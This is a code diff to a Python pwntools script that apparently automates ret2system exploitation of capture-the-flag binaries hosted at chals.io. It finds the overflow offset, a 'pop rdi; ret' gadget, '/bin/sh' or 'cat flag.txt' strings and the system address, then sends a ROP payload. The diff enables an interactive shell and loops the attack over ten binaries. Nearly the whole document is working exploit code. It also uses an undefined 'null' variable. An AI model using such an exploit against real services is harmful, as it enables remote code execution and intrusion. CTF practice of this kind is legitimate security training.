@@ -14,7 +14,7 @@ def exploit(binary: str):
     url = f'ace-service-{binary}.chals.io'
     p = remote(url, 443, ssl=True, sni=url)
     if p:
-        print('connected')
+        print('[+] Connected to host')
     e = ELF(binary)
     r = ROP(e)
 
@@ -23,33 +23,37 @@ def exploit(binary: str):
     payload = b''
 
     offset = detection.find_rip_offset(binary)
-    print("Offset:", offset)
+    print("[+] Offset:", offset)
     system = null
     pop_rdi = null
-    print(e.symbols)
+
     try:
         pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
+        print(f"[+] Location of pop RDI : {hex(pop_rdi)}")
     except:
-        print('pop rdi; ret; not found')
+        print('[!] pop rdi; ret; not found')
         pass
     # print(pop_rdi)
     shell = null
     cat = null
     try:
-        shell = next(e.search(b'/bin/sh\x00'))
+        shell = next(e.search(b'/bin/sh'))
+        print(f"[+]Location of bin/sh: {hex(shell)}")
     except:
-        print('bin/shell not found')
+        print('[!] bin/shell not found')
         pass
     try:
-        cat = next(e.search(b'/bin/cat flag.txt\x00'))
+        cat = next(e.search(b'/bin/cat flag.txt'))
+        print(f"[+]Location of bin/cat flag.txt: {hex(cat)}")
     except:
-        print('bin/cat flag not found')
+        print('[!] bin/cat flag not found')
         pass
-    # try:
-    #     system = e.sym['exit']
-    # except KeyError:
-    #     print('system not found in a ret2system lol')
-    print(system)
+    try:
+        system = e.sym['system']
+        print(f"[+] System Address: {hex(system)}")
+    except KeyError:
+        print('[!] system not found in a ret2system lol')
+
     payload += cyclic(offset)
     payload += p64(pop_rdi)  # pop RDI
     if cat != null:
@@ -57,6 +61,7 @@ def exploit(binary: str):
         payload += p64(cat)
         payload += p64(system)
         p.sendline(payload)
+
     elif shell != null:
         print('bin/sh')
         payload += p64(shell)
@@ -64,9 +69,9 @@ def exploit(binary: str):
         p.sendline(payload)
         # p.wait()
         p.sendline(b'cat flag.txt')
-        # p.interactive()
+        p.interactive()
     else:
-        print('uhhhhhhhhhhhh')
+        print('[!] uhhhhhhhhhhhh')
 
     output = p.recvall(timeout=0.2)
 
@@ -78,9 +83,9 @@ def exploit(binary: str):
 
 
 def main():  # TEMP FOR TESTING
-    # for i in range(10):
-    print(f"bin-ret2syscall-{0}")
-    exploit(f"bin-ret2syscall-{0}")
+    for i in range(10):
+        print(f"bin-ret2system-{i}")
+        exploit(f"bin-ret2system-{i}")
 
 
 main()
